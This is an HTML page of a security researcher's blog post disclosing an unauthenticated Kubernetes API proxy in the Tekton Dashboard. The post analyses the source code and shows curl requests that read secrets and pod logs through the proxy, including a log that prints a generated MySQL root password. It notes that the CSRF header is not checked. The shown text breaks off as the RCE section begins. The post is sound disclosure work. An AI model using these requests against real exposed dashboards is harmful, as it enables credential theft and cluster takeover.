@@ -1,0 +1,422 @@
+<!DOCTYPE html>
+<html><head>
+    <meta charset="utf-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />
+
+    <title>Tekton Dashboard RCE and Kubernetes API Proxy - Flomb Blog</title>
+
+    
+    
+    <meta name="description" content="This is the story of how I found two vulnerabilities in the Tekton CI/CD Dashboard component that allow remote code execution and a potential node takeover if deployed in read/write mode as well as pre-authenticated access to the Kubernetes API server in all modes.
+Both vulnerabilities were treated as intended and are thus still exploitable. The documentation was changed and the default mode is now read-only instead of read/write.
+It started when I stumbled upon an unusual finding during an assessment." />
+    <meta name="author" content="" />
+    
+
+    <link href="https://unpkg.com/@master/normal.css" rel="stylesheet">
+    <script src="https://unpkg.com/@master/style@1.5.0"></script>
+    <script src="https://unpkg.com/@master/styles@1.13.0"></script>
+    <script src="https://unpkg.com/master-styles-group"></script>
+    <script src="https://unpkg.com/themes.js"></script>
+    <script>window.themes = window.themes || new window.Themes()</script>
+
+    <style>
+        :root {
+            --font-sans: "Inter var", ui-sans-serif, system-ui, -apple-system, BlinkMacSystemFont, Segoe UI, Roboto, Helvetica Neue, Arial, Noto Sans, sans-serif, Apple Color Emoji, Segoe UI Emoji, Segoe UI Symbol, Noto Color Emoji;
+        }
+    </style></head>
+<body class="bg:fade-84@dark font:fade-16@dark font:sans">
+    <nav class="w:full h:90 fixed bg:fade-84/.95@dark bg:white z:1000">
+    <div class="
+        h:full
+        w:full
+        max-w:1200
+        mx:auto
+        d:flex
+        align-items:center
+    ">
+        <div>
+            <a href="/" class="mr-3 font:extralight">
+              
+              Flomb Blog
+              
+            </a>
+        </div>
+
+        <div class="ml:auto">
+            
+            
+            
+            
+            <a class="
+                font:semibold
+                font:fade
+                font:fade-10:hover
+                font:fade-30.active
+                px:8
+                transition:150ms;ease-in
+                
+            " href="/about/" title="">About</a>
+            
+        </div>
+    </div>
+</nav>
+<div class="d:flex flex:column@<=sm pt:90 jc:center gap:44 word-break:break-word">
+        <div class="max-w:1200 w:full box:content-box">
+            <style>
+                div.highlight pre {
+                    white-space: pre-wrap;
+                    word-break: break-word;
+                    font-size: large;
+                    }
+            </style>
+<article class="box:border-box pt:32">
+    <header class="mb:32">
+        <div class="font:40 font:extrabold">Tekton Dashboard RCE and Kubernetes API Proxy</div>
+        <div class="mt:16 f:fade-60">
+            <time>Sep 3, 2024</time>
+            </div>
+    </header><div class="
+    _:where(a):hover{text-decoration-color:fade}
+    _:where(a){text-decoration:2;underline;fade-10;_text-decoration-color:fade-70@dark}
+    _:where(blockquote){bl:5;solid;fade-76/.1;_bl:5;solid;fade-34/.1@dark}
+    _:where(code){font:90%;_v:middle}
+    _:where(code:not(.highlight_*,pre_*)){p:2;6;_r:4}
+    _:where(del){text-decoration:1;line-through;fade-68;_text-decoration-color:red-64@dark}
+    _:where(figcaption){text:14;_p:10;20;0;_width:fit;_mx:auto;_font:fade-56;_font:fade-57@dark}
+    _:where(h1){font:40;_font:extrabold}
+    _:where(h1,h2,h3)+:where(h1,h2,h3){mt:.5em}
+    _:where(h1,h2,h3,h4,h5,h6){mt:2em}
+    _:where(h2){mb:1em;_font:32}
+    _:where(h3){font:24}
+    _:where(h4){font:20}
+    _:where(h5){font:16}
+    _:where(h6){font:14}
+    _:where(li)::marker{font:fade-44;_font:fade-68@dark}
+    _:where(li){pl:.375em}
+    _:where(mark){text-decoration:1;underline;#fce016;_bg:transparent;_text-decoration-color:rgb(252;224;22/.5)@dark}
+    _:where(p,li){font:fade-76;_font:16;_line-height:1.65;_font:fade-34@dark}
+    _:where(p,pre,blockquote,figure,ul,ol,table){my:1.125em}
+    >:first-child{mt:0!}
+    _:where(pre){p:20;_r:8;_overflow:auto}
+    _:where(pre,code:not(.highlight_*)){bg:fade-2;_bg:fade-92!@dark}
+    _:where(strong,b,a,code:not(.highlight_*),mark,del){font:fade-92;_font:fade-12@dark}
+    _:where(table){width:full;_border-spacing:0}
+    _:where(td){v:baseline}
+    _:where(td,th):first-child{pl:0}
+    _:where(td,th):last-child{pr:0}
+    _:where(td,th){bb:1;solid;fade-92/.06;_p:6;_b:fade-4/.04@dark}
+    _:where(th){font:fade-78;_font:14;_text:left;_font:fade-12@dark}
+    _:where(th,p_code,li_code,a,mark){font:semibold;_font:medium@dark}
+    _:where(ul){list-style-type:disc}
+    _:where(ul,ol,blockquote){pl:1.5em}
+    _:where(video,img){max-width:full}
+    _:where(a,mark){text-underline-offset:3}
+    _:where(hr){h:2;_bg:fade-10;_bg:fade-70@dark;_my:3em}
+"><p>This is the story of how I found two vulnerabilities in the <a href="https://github.com/tektoncd/dashboard">Tekton CI/CD Dashboard component</a> that allow remote code execution and a potential node takeover if deployed in <code>read/write</code> mode as well as pre-authenticated access to the Kubernetes API server in all modes.</p>
+<p>Both vulnerabilities were treated as intended and are thus still exploitable. The documentation was changed and the default mode is now <code>read-only</code> instead of <code>read/write</code>.</p>
+<p>It started when I stumbled upon an unusual finding during an assessment. The scanning of our internal attack surface management solution reported either an internet-exposed Kubernetes API server, which is not too uncommon, or an exposed kubelet API. The latter hadn&rsquo;t been observed in our client&rsquo;s scope before, prompting me to investigate further.</p>
+<h3 id="kubelet">Kubelet</h3>
+<p>The <a href="https://kubernetes.io/docs/reference/command-line-tools-reference/kubelet/">kubelet</a> is a binary running on every node that&rsquo;s part of a Kubernetes cluster. It interacts with the container runtime to create the actual containers. These are either based on pods requested by the Kubernetes API or the control plane components themselves, implemented as <a href="https://kubernetes.io/docs/tasks/configure-pod-container/static-pod/">static containers</a>.</p>
+<p>The Kubernetes API pod, for example, is defined in <code>/etc/kubernetes/manifests/kube-apiserver.yaml</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-yaml" data-lang="yaml"><span style="display:flex;"><span><span style="color:#f92672">apiVersion</span>: <span style="color:#ae81ff">v1</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">kind</span>: <span style="color:#ae81ff">Pod</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">metadata</span>:
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">annotations</span>:
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">kubeadm.kubernetes.io/kube-apiserver.advertise-address.endpoint</span>: <span style="color:#ae81ff">192.168.49.2</span>:<span style="color:#ae81ff">8443</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">creationTimestamp</span>: <span style="color:#66d9ef">null</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">labels</span>:
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">component</span>: <span style="color:#ae81ff">kube-apiserver</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">tier</span>: <span style="color:#ae81ff">control-plane</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">name</span>: <span style="color:#ae81ff">kube-apiserver</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">namespace</span>: <span style="color:#ae81ff">kube-system</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">spec</span>:
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">containers</span>:
+</span></span><span style="display:flex;"><span>  - <span style="color:#f92672">command</span>:
+</span></span><span style="display:flex;"><span>    - <span style="color:#ae81ff">kube-apiserver</span>
+</span></span><span style="display:flex;"><span>    - --<span style="color:#ae81ff">advertise-address=192.168.49.2</span>
+</span></span><span style="display:flex;"><span>    - --<span style="color:#ae81ff">allow-privileged=true</span>
+</span></span><span style="display:flex;"><span>    - --<span style="color:#ae81ff">authorization-mode=Node,RBAC</span>
+</span></span><span style="display:flex;"><span>...
+</span></span></code></pre></div><p>By default, the kubelet starts with the <code>--anonymous-auth</code> parameter set to <code>true</code> and <code>--authorization-mode</code> set to <code>AlwaysAllow</code>. Consequently, unauthenticated network access to the kubelet&rsquo;s own API grants full control over the containers. Exploitation of this configuration was previously described in <a href="https://www.cyberark.com/resources/threat-research-blog/using-kubelet-client-to-attack-the-kubernetes-cluster">this blog post</a>.</p>
+<p>Unfortunately, accessing the reported endpoint at <code>/pods</code> returned a 404 error, indicating that it was not a kubelet. It could still be a Kubernetes API server, but that would require authentication. A quick test revealed the following:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl http://tekton-dashboard:9097/api/v1/secrets
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;kind&#34;</span>: <span style="color:#e6db74">&#34;Status&#34;</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;apiVersion&#34;</span>: <span style="color:#e6db74">&#34;v1&#34;</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;metadata&#34;</span>: {},
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;status&#34;</span>: <span style="color:#e6db74">&#34;Failure&#34;</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;message&#34;</span>: <span style="color:#e6db74">&#34;secrets is forbidden: User \&#34;system:serviceaccount:tekton-pipelines:tekton-dashboard\&#34; cannot list resource \&#34;secrets\&#34; in API group \&#34;\&#34; at the cluster scope&#34;</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;reason&#34;</span>: <span style="color:#e6db74">&#34;Forbidden&#34;</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;details&#34;</span>: {
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;kind&#34;</span>: <span style="color:#e6db74">&#34;secrets&#34;</span>
+</span></span><span style="display:flex;"><span>  },
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;code&#34;</span>: <span style="color:#ae81ff">403</span>
+</span></span><span style="display:flex;"><span>} 
+</span></span></code></pre></div><p>This response strongly resembles a Kubernetes API reply and, more importantly, it appears to be authenticated as the <code>system:serviceaccount:tekton-pipelines:tekton-dashboard</code> user. Apparently we are dealing with some pre-authenticated proxying behavior.</p>
+<h3 id="proxying-with-tekton">Proxying with Tekton</h3>
+<p>As indicated by the name of the service account, we were dealing with <a href="https://tekton.dev/">Tekton</a> and its dashboard component:</p>
+<blockquote>
+<p>Tekton is a powerful and flexible open-source framework for creating CI/CD systems, allowing developers to build, test, and deploy across cloud providers and on-premise systems.</p>
+</blockquote>
+<p>Rather than immediately reconsidering the attack surface, I decided to investigate the unusual proxying behavior further. I checked the <a href="https://tekton.dev/docs/dashboard/install/#installing-tekton-dashboard-on-kubernetes">documentation</a> and found that the installation is just a Kubernetes configuration YAML file:</p>
+<pre tabindex="0"><code>kubectl apply --filename https://storage.googleapis.com/tekton-releases/dashboard/latest/release.yaml
+</code></pre><p>This file contains a definition of a <code>tekton-dashboard</code> service account and its role bindings. While I didn&rsquo;t review the roles exhaustively, I quickly noticed read access to <code>pods</code> and <code>pods/logs</code>. This presented a potential quick win because it meant access to container stdout and pod definitions, both of which could contain sensitive information.</p>
+<p>Using the pre-authenticated proxying behavior it is indeed possible to view pod definitions using:</p>
+<p><img src="env.png" alt=""></p>
+<p>This artificial example contained a hard-coded secret value, obviously not recommended but nonetheless it happens. The same <a href="https://hub.docker.com/_/mysql">MySQL image</a> used in this scenario could also be started with the <code>MYSQL_RANDOM_ROOT_PASSWORD</code> environment variable set. This generates a random password and prints it to stdout, where it is still publicly accessible:</p>
+<pre tabindex="0"><code>$ curl -s http://tekton-dashboard:9097/api/v1/namespaces/default/pods/db/log 
+...
+2024-09-07 12:10:11+00:00 [Note] [Entrypoint]: Temporary server started.
+&#39;/var/lib/mysql/mysql.sock&#39; -&gt; &#39;/var/run/mysqld/mysqld.sock&#39;
+2024-09-07 12:10:13+00:00 [Note] [Entrypoint]: GENERATED ROOT PASSWORD: dJZurxd0BGJIPcYPUphZ3QcnWd9IbdxG
+</code></pre><p>At this point, I had gained access to several credentials and informed the client accordingly.</p>
+<p>To see what else we can do with that endpoint let&rsquo;s take a look at the <a href="https://github.com/tektoncd/dashboard/blob/main/cmd/dashboard/main.go#L43">source code</a>. Initially, <a href="https://pkg.go.dev/k8s.io/client-go@v0.31.0#section-readme">client-go&rsquo;s</a> <code>InClusterConfig()</code> is used to get a <code>config</code> containing the authentication details of the service account.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">main</span>() {
+</span></span><span style="display:flex;"><span><span style="color:#f92672">...</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">cfg</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">rest</span>.<span style="color:#a6e22e">Config</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">err</span> <span style="color:#66d9ef">error</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">cfg</span>, <span style="color:#a6e22e">err</span> = <span style="color:#a6e22e">rest</span>.<span style="color:#a6e22e">InClusterConfig</span>();
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">logging</span>.<span style="color:#a6e22e">Log</span>.<span style="color:#a6e22e">Errorf</span>(<span style="color:#e6db74">&#34;Error building kubeconfig: %s&#34;</span>, <span style="color:#a6e22e">err</span>.<span style="color:#a6e22e">Error</span>())
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span><span style="color:#f92672">...</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">server</span>, <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">router</span>.<span style="color:#a6e22e">Register</span>(<span style="color:#a6e22e">resource</span>, <span style="color:#a6e22e">cfg</span>)
+</span></span><span style="display:flex;"><span><span style="color:#f92672">...</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">l</span>, <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">server</span>.<span style="color:#a6e22e">Listen</span>(<span style="color:#e6db74">&#34;&#34;</span>, <span style="color:#f92672">*</span><span style="color:#a6e22e">portNumber</span>)
+</span></span><span style="display:flex;"><span><span style="color:#f92672">...</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">logging</span>.<span style="color:#a6e22e">Log</span>.<span style="color:#a6e22e">Fatal</span>(<span style="color:#a6e22e">server</span>.<span style="color:#a6e22e">ServeOnListener</span>(<span style="color:#a6e22e">l</span>))
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span><span style="color:#f92672">...</span>
+</span></span></code></pre></div><p>That <code>config</code> is then used in the <a href="https://github.com/tektoncd/dashboard/blob/main/pkg/router/router.go#L125"><code>Register()</code></a> function  to create a <code>proxyHandler</code> to serve endpoints with paths starting with either <code>/api/</code> or <code>/apis/</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">Register</span>(<span style="color:#a6e22e">r</span> <span style="color:#a6e22e">endpoints</span>.<span style="color:#a6e22e">Resource</span>, <span style="color:#a6e22e">cfg</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">rest</span>.<span style="color:#a6e22e">Config</span>) (<span style="color:#f92672">*</span><span style="color:#a6e22e">Server</span>, <span style="color:#66d9ef">error</span>) {
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">logging</span>.<span style="color:#a6e22e">Log</span>.<span style="color:#a6e22e">Info</span>(<span style="color:#e6db74">&#34;Adding Kube API&#34;</span>)
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">apiProxyPrefix</span> <span style="color:#f92672">:=</span> <span style="color:#e6db74">&#34;/api/&#34;</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">apisProxyPrefix</span> <span style="color:#f92672">:=</span> <span style="color:#e6db74">&#34;/apis/&#34;</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">proxyHandler</span>, <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">NewProxyHandler</span>(<span style="color:#a6e22e">cfg</span>, <span style="color:#ae81ff">30</span><span style="color:#f92672">*</span><span style="color:#a6e22e">time</span>.<span style="color:#a6e22e">Second</span>)
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> <span style="color:#66d9ef">nil</span>, <span style="color:#a6e22e">err</span>
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">mux</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">http</span>.<span style="color:#a6e22e">NewServeMux</span>()
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">mux</span>.<span style="color:#a6e22e">Handle</span>(<span style="color:#a6e22e">apiProxyPrefix</span>, <span style="color:#a6e22e">proxyHandler</span>) 
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">mux</span>.<span style="color:#a6e22e">Handle</span>(<span style="color:#a6e22e">apisProxyPrefix</span>, <span style="color:#a6e22e">proxyHandler</span>)
+</span></span></code></pre></div><p>The <code>proxyHandler</code> is created via <a href="https://github.com/tektoncd/dashboard/blob/main/pkg/router/router.go#L148"><code>NewProxyHandler()</code></a>. This looks familiar, as it is almost identical to the <a href="https://github.com/kubernetes/kubectl/blob/master/pkg/proxy/proxy_server.go#L195">code</a> used by <code>kubectl</code> itself when proxying connections to the Kubernetes API (<code>kubectl proxy</code>).</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">NewProxyHandler</span>(<span style="color:#a6e22e">cfg</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">rest</span>.<span style="color:#a6e22e">Config</span>, <span style="color:#a6e22e">keepalive</span> <span style="color:#a6e22e">time</span>.<span style="color:#a6e22e">Duration</span>) (<span style="color:#a6e22e">http</span>.<span style="color:#a6e22e">Handler</span>, <span style="color:#66d9ef">error</span>) {
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">host</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">cfg</span>.<span style="color:#a6e22e">Host</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> !<span style="color:#a6e22e">strings</span>.<span style="color:#a6e22e">HasSuffix</span>(<span style="color:#a6e22e">host</span>, <span style="color:#e6db74">&#34;/&#34;</span>) {
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">host</span> <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;/&#34;</span>
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">target</span>, <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">url</span>.<span style="color:#a6e22e">Parse</span>(<span style="color:#a6e22e">host</span>)
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> <span style="color:#66d9ef">nil</span>, <span style="color:#a6e22e">err</span>
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">responder</span> <span style="color:#f92672">:=</span> <span style="color:#f92672">&amp;</span><span style="color:#a6e22e">responder</span>{}
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">transport</span>, <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">rest</span>.<span style="color:#a6e22e">TransportFor</span>(<span style="color:#a6e22e">cfg</span>)
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> <span style="color:#66d9ef">nil</span>, <span style="color:#a6e22e">err</span>
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">upgradeTransport</span>, <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">makeUpgradeTransport</span>(<span style="color:#a6e22e">cfg</span>, <span style="color:#a6e22e">keepalive</span>)
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> <span style="color:#66d9ef">nil</span>, <span style="color:#a6e22e">err</span>
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">proxy</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">proxy</span>.<span style="color:#a6e22e">NewUpgradeAwareHandler</span>(<span style="color:#a6e22e">target</span>, <span style="color:#a6e22e">transport</span>, <span style="color:#66d9ef">false</span>, <span style="color:#66d9ef">false</span>, <span style="color:#a6e22e">responder</span>)
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">proxy</span>.<span style="color:#a6e22e">UpgradeTransport</span> = <span style="color:#a6e22e">upgradeTransport</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">proxy</span>.<span style="color:#a6e22e">UseRequestLocation</span> = <span style="color:#66d9ef">true</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">proxy</span>.<span style="color:#a6e22e">UseLocationHost</span> = <span style="color:#66d9ef">true</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">proxyServer</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">protectWebSocket</span>(<span style="color:#a6e22e">proxy</span>) <span style="color:#f92672">&lt;--</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">proxyServer</span>, <span style="color:#66d9ef">nil</span>
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>A noticeable change is the addition of <code>protectWebSocket(proxy)</code>, this is a protection against cross-origin websocket hijacking, which is irrelevant as we are not constrained by a browser and therefore able to set arbitrary values for the <code>origin</code> header.</p>
+<p>Additionally, <code>kubectl's</code> <a href="https://github.com/kubernetes/kubectl/blob/master/pkg/proxy/proxy_server.go#L195"><code>NewProxyHandler()</code></a> contained the following part that could filter requests based on their host, path or HTTP method. It is however missing for the Tekton Dashboard.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#66d9ef">if</span> <span style="color:#a6e22e">filter</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">proxyServer</span> = <span style="color:#a6e22e">filter</span>.<span style="color:#a6e22e">HandlerFor</span>(<span style="color:#a6e22e">proxyServer</span>)
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Next, the <a href="https://github.com/tektoncd/dashboard/blob/main/pkg/router/router.go#L183"><code>ServeOnListener()</code></a> function is called on the <code>router.Server</code> returned by <code>Register()</code> which appears to add a CSRF protection:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#66d9ef">func</span> (<span style="color:#a6e22e">s</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">Server</span>) <span style="color:#a6e22e">ServeOnListener</span>(<span style="color:#a6e22e">l</span> <span style="color:#a6e22e">net</span>.<span style="color:#a6e22e">Listener</span>) <span style="color:#66d9ef">error</span> {
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">CSRF</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">csrf</span>.<span style="color:#a6e22e">Protect</span>()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">server</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">http</span>.<span style="color:#a6e22e">Server</span>{
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">Handler</span>:           <span style="color:#a6e22e">CSRF</span>(<span style="color:#a6e22e">s</span>.<span style="color:#a6e22e">handler</span>),
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">ReadHeaderTimeout</span>: <span style="color:#ae81ff">30</span> <span style="color:#f92672">*</span> <span style="color:#a6e22e">time</span>.<span style="color:#a6e22e">Second</span>,
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">server</span>.<span style="color:#a6e22e">Serve</span>(<span style="color:#a6e22e">l</span>)
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>By applying <code>CSRF()</code> to the original <code>http.Handler</code> inside <code>router.Server</code>, a new <code>csrf</code> struct is returned which implements the <code>Handler</code> interface to wrap <code>ServeHTTP()</code>. This will in turn be called by <code>http.Server.Serve(l)</code>. Then, for HTTP methods deemed unsafe like <code>POST</code>, a hard-coded HTTP header with the name <code>Tekton-Client</code> is expected:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#66d9ef">func</span> (<span style="color:#a6e22e">cs</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">csrf</span>) <span style="color:#a6e22e">ServeHTTP</span>(<span style="color:#a6e22e">w</span> <span style="color:#a6e22e">http</span>.<span style="color:#a6e22e">ResponseWriter</span>, <span style="color:#a6e22e">r</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">http</span>.<span style="color:#a6e22e">Request</span>) {
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">_</span>, <span style="color:#a6e22e">ok</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">safeMethods</span>[<span style="color:#a6e22e">r</span>.<span style="color:#a6e22e">Method</span>]; !<span style="color:#a6e22e">ok</span> {
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">csrfHeader</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">r</span>.<span style="color:#a6e22e">Header</span>.<span style="color:#a6e22e">Get</span>(<span style="color:#a6e22e">cs</span>.<span style="color:#a6e22e">opts</span>.<span style="color:#a6e22e">HeaderName</span>)
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">csrfHeader</span> <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;&#34;</span> {
+</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">cs</span>.<span style="color:#a6e22e">opts</span>.<span style="color:#a6e22e">ErrorHandler</span>.<span style="color:#a6e22e">ServeHTTP</span>(<span style="color:#a6e22e">w</span>, <span style="color:#a6e22e">r</span>)
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">return</span>
+</span></span><span style="display:flex;"><span>		}
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">cs</span>.<span style="color:#a6e22e">h</span>.<span style="color:#a6e22e">ServeHTTP</span>(<span style="color:#a6e22e">w</span>, <span style="color:#a6e22e">r</span>)
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>The value of said header does apparently not matter. To be sure we can just set it for all requests regardless of the HTTP method being used. Other than that there were no restrictions.</p>
+<p><strong>To summarize, if someone adhered to best practices and restricted network access to the Kubernetes API server but has a Tekton dashboard exposed to the internet, we can use its proxy to gain almost unrestricted access to the API server again. Additionally, we can either bring our &ldquo;own&rdquo; credentials or act with whatever privileges the <code>tekton-dashboard</code> service account has.</strong></p>
+<p>For convenience, I <a href="https://github.com/fl0mb/kubernetes">patched</a> <code>kubectl</code> to add the <code>Tekton-Client</code> header and to allow authenticating when using unencrypted HTTP. Now we can either use the privileges of the <code>tekton-dashboard</code> service account:</p>
+<p><img src="whoami.png" alt=""></p>
+<p>Or use credentials obtained in another way, for example, service account tokens read via a file inclusion vulnerability in a web application:</p>
+<p><img src="shell.png" alt=""></p>
+<h3 id="rce">RCE</h3>
+<p>Initially, when I visited the root URL I noticed the following import function:</p>
